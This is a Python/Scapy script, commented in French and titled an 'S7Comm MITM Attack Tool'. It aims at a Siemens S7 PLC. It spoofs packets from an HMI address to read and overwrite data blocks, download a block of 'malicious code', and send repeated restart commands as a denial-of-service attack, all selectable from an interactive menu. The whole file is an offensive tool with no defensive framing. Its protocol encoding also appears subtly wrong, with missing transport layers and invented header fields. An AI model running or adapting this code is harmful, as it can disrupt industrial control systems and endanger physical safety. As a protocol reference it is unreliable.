from scapy.all import *
import struct
import time

# Configuration réseau
ip_master = "192.168.1.100"  # HMI/SCADA
ip_plc = "192.168.1.10"      # PLC Siemens S7-300/400
sport = 102                   # Port S7Comm standard
dport = 102
seq_num = 100000
ack_num = 200000

# S7Comm - Write Request (Job)
def create_s7comm_write_request():
    # En-tête S7Comm
    protocol_id = 0x32        # S7Comm
    job_type = 0x01           # Job
    function_group = 0x04     # Programming
    function_code = 0x05      # Write
    sequence_number = 0x0001
    parameter_length = 0x0008
    data_length = 0x0004
    
    # Paramètres
    transport_size = 0x02     # BYTE
    length = 0x0001           # 1 byte
    db_number = 0x0001        # DB1
    area = 0x84              # DB area
    address = 0x000000        # Offset 0
    
    # Données à écrire
    data_value = 0xAA         # Valeur malveillante
    
    # Construction du payload
    payload = struct.pack(">BBBBHHHBBHHBB",
        protocol_id,
        job_type,
        function_group,
        function_code,
        sequence_number,
        parameter_length,
        data_length,
        transport_size,
        length,
        db_number,
        area,
        address >> 16,
        address & 0xFFFF
    ) + struct.pack(">B", data_value)
    
    return payload

# S7Comm - Read Request (Job)
def create_s7comm_read_request():
    protocol_id = 0x32
    job_type = 0x01
    function_group = 0x04
    function_code = 0x04      # Read
    sequence_number = 0x0002
    parameter_length = 0x0008
    data_length = 0x0000
    
    # Paramètres de lecture
    transport_size = 0x02
    length = 0x0001
    db_number = 0x0001
    area = 0x84
    address = 0x000000
    
    payload = struct.pack(">BBBBHHHBBHHBB",
        protocol_id,
        job_type,
        function_group,
        function_code,
        sequence_number,
        parameter_length,
        data_length,
        transport_size,
        length,
        db_number,
        area,
        address >> 16,
        address & 0xFFFF
    )
    
    return payload

# S7Comm - Hot Restart (Attaque critique)
def create_s7comm_hot_restart():
    protocol_id = 0x32
    job_type = 0x01
    function_group = 0x04
    function_code = 0x28      # Hot Restart
    sequence_number = 0x0003
    parameter_length = 0x0000
    data_length = 0x0000
    
    payload = struct.pack(">BBBBHHH",
        protocol_id,
        job_type,
        function_group,
        function_code,
        sequence_number,
        parameter_length,
        data_length
    )
    
    return payload

# S7Comm - Cold Restart (Attaque critique)
def create_s7comm_cold_restart():
    protocol_id = 0x32
    job_type = 0x01
    function_group = 0x04
    function_code = 0x29      # Cold Restart
    sequence_number = 0x0004
    parameter_length = 0x0000
    data_length = 0x0000
    
    payload = struct.pack(">BBBBHHH",
        protocol_id,
        job_type,
        function_group,
        function_code,
        sequence_number,
        parameter_length,
        data_length
    )
    
    return payload

# S7Comm - Download Block (Injection de code malveillant)
def create_s7comm_download_block():
    protocol_id = 0x32
    job_type = 0x01
    function_group = 0x04
    function_code = 0x1B      # Download Block
    sequence_number = 0x0005
    parameter_length = 0x0008
    data_length = 0x0010
    
    # Paramètres du bloc
    block_type = 0x08         # DB (Data Block)
    block_number = 0x0001     # DB1
    destination_file_system = 0x0000
    
    # Code malveillant (simplifié)
    malicious_code = b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F"
    
    payload = struct.pack(">BBBBHHHBBH",
        protocol_id,
        job_type,
        function_group,
        function_code,
        sequence_number,
        parameter_length,
        data_length,
        block_type,
        block_number,
        destination_file_system
    ) + malicious_code
    
    return payload

# Fonction d'attaque MITM
def s7comm_mitm_attack():
    print("[+] Démarrage de l'attaque S7Comm MITM...")
    
    # 1. Lecture des données sensibles
    print("[+] Phase 1: Lecture des données critiques...")
    read_payload = create_s7comm_read_request()
    ip = IP(src=ip_master, dst=ip_plc)
    tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num, ack=ack_num)
    read_packet = ip / tcp / Raw(load=read_payload)
    send(read_packet, verbose=1)
    
    time.sleep(1)
    
    # 2. Modification malveillante des données
    print("[+] Phase 2: Injection de données malveillantes...")
    write_payload = create_s7comm_write_request()
    tcp.seq += len(read_payload)
    tcp.ack += 1
    write_packet = ip / tcp / Raw(load=write_payload)
    send(write_packet, verbose=1)
    
    time.sleep(1)
    
    # 3. Injection de code malveillant
    print("[+] Phase 3: Injection de code malveillant...")
    download_payload = create_s7comm_download_block()
    tcp.seq += len(write_payload)
    tcp.ack += 1
    download_packet = ip / tcp / Raw(load=download_payload)
    send(download_packet, verbose=1)
    
    time.sleep(1)
    
    # 4. Attaque de déni de service
    print("[+] Phase 4: Attaque DoS - Redémarrage du PLC...")
    restart_payload = create_s7comm_cold_restart()
    tcp.seq += len(download_payload)
    tcp.ack += 1
    restart_packet = ip / tcp / Raw(load=restart_payload)
    send(restart_packet, verbose=1)
    
    print("[+] Attaque S7Comm terminée!")

# Fonction de reconnaissance
def s7comm_reconnaissance():
    print("[+] Reconnaissance S7Comm...")
    
    # Tentative de connexion et identification
    connect_payload = struct.pack(">BBBBHHH", 0x32, 0x01, 0x04, 0x01, 0x0001, 0x0000, 0x0000)
    
    ip = IP(src=ip_master, dst=ip_plc)
    tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num, ack=ack_num)
    packet = ip / tcp / Raw(load=connect_payload)
    
    send(packet, verbose=1)
    print("[+] Paquet de reconnaissance envoyé")

# Fonction d'attaque par déni de service
def s7comm_dos_attack():
    print("[+] Attaque DoS S7Comm...")
    
    # Envoi massif de requêtes de redémarrage
    for i in range(10):
        restart_payload = create_s7comm_hot_restart()
        ip = IP(src=ip_master, dst=ip_plc)
        tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num+i, ack=ack_num+i)
        packet = ip / tcp / Raw(load=restart_payload)
        send(packet, verbose=0)
        time.sleep(0.1)
    
    print("[+] Attaque DoS terminée!")

if __name__ == "__main__":
    print("=== S7Comm MITM Attack Tool ===")
    print("1. Reconnaissance")
    print("2. Attaque complète")
    print("3. Attaque DoS")
    
    choice = input("Choix (1/2/3): ")
    
    if choice == "1":
        s7comm_reconnaissance()
    elif choice == "2":
        s7comm_mitm_attack()
    elif choice == "3":
        s7comm_dos_attack()
    else:
        print("Choix invalide")
